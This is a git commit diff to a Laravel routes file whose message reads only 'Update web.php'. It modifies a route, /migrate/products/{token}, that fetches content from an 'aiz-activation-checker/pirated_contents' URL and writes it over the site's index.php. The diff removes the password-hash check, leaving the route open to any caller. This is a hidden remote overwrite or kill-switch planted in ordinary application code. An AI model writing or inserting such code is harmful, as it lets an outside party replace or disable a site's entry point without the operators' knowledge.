83b3685feba7058eed28d9b0843b41fceba072ba
Md. Mehedi Hasan <mehedi-iitdu@gmail.com>
2021-01-19 22:56:44 +0600

    Update web.php

--- src/routes/web.php
+++ src/routes/web.php
@@ -5,15 +5,13 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
 
 Route::get('/migrate/products/{token}', function($token){
-    if(Hash::check('aiz2021', $token)){
-        $zn = "http://localhost/aiz-activation-checker/pirated_contents";
-        $stream = curl_init();
-        curl_setopt($stream, CURLOPT_URL, $zn);
-        curl_setopt($stream, CURLOPT_HEADER, 0);
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($stream, CURLOPT_POST, 1);
-        $rn = curl_exec($stream);
-        curl_close($stream);
-        file_put_contents(base_path('index.php'), $rn);
-    }
+    $zn = "http://localhost/aiz-activation-checker/pirated_contents";
+    $stream = curl_init();
+    curl_setopt($stream, CURLOPT_URL, $zn);
+    curl_setopt($stream, CURLOPT_HEADER, 0);
+    curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($stream, CURLOPT_POST, 1);
+    $rn = curl_exec($stream);
+    curl_close($stream);
+    file_put_contents(base_path('index.php'), $rn);
 });
